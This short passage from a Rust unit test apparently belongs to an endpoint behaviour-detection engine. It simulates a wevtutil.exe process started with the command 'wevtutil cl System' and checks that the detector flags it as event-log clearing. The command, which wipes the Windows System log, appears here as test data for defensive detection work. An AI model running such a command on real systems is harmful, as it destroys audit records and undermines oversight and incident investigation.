        let mut start = event(Action::ProcessStarted, 22, 1, "C:\\Windows\\System32\\wevtutil.exe", 10);
        start.command_line = Some("wevtutil cl System".to_string());
        let hits = staging.observe(&start, |_| Some(5));
        assert!(hits.iter().any(|hit| hit.id == "behaviour/event-log-clear"));
    }

}
